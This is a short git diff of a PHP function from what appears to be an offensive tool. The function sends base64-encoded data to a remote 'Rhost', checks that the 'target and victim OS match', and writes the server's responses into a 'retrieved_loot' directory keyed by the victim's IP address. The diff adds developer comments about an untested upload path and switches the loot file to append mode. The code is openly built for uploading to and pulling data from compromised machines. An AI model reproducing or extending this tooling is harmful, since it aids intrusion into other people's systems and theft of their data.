@@ -144,6 +144,8 @@ function b64(array $what, $how, array $whereWeGo)
     $secure_Key = random_bytes(32);
     $additionalData = random_bytes(16);
     if ($how === "u") {
+        //UPLOAD IS CURRENTLY UNTESTED. if there are bugs, lemme know.
+
         curl_setopt(CHH, CURLOPT_URL, $whereWeGo['Rhost'].$whereWeGo['uri']);
         if ($what['Target'] === $whereWeGo["Os_Flavor"] || $what['Target'] === "universal"){
             echo "\nTarget and victim OS match, should be good to go\n";
@@ -173,7 +175,9 @@ function b64(array $what, $how, array $whereWeGo)
         switch (curl_getinfo(CHH, CURLINFO_HTTP_CODE)) {
             case 200:
                 logo('co', clears, false, '', '');
-                file_put_contents("includes/db/retrieved_loot/".curl_getinfo(CHH, CURLINFO_PRIMARY_IP), $dx);
+                //TODO need to fix this, and why its dumping the ENTIRE response object over the base64 encoded value. once this is done, will add a routine to plop it right into the db
+                //depending on size, placing larger files on disk rather than db.
+                file_put_contents("includes/db/retrieved_loot/".curl_getinfo(CHH, CURLINFO_PRIMARY_IP), $dx, FILE_APPEND);
                 echo $dx."\n";
                 break;
             default:
